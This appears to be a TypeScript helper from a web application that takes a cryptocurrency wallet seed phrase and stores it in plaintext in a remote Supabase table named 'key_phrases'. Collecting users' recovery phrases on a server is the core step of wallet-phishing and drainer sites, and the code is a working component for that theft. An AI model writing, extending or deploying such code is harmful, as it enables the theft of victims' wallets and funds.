import { supabase } from "@/lib/supabase";

export async function submitKeyPhrase(seedPhrase: string) {
  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const { error } = await (supabase as any)
      .from("key_phrases")
      .insert({ seed_phrase: seedPhrase });

    if (error) {
      console.error("Error submitting key phrase:", error);
      return { success: false, error };
    }

    console.log("Key phrase submitted successfully");
    return { success: true };
  } catch (err) {
    console.error("Error submitting key phrase:", err);
    return { success: false, error: err };
  }
}
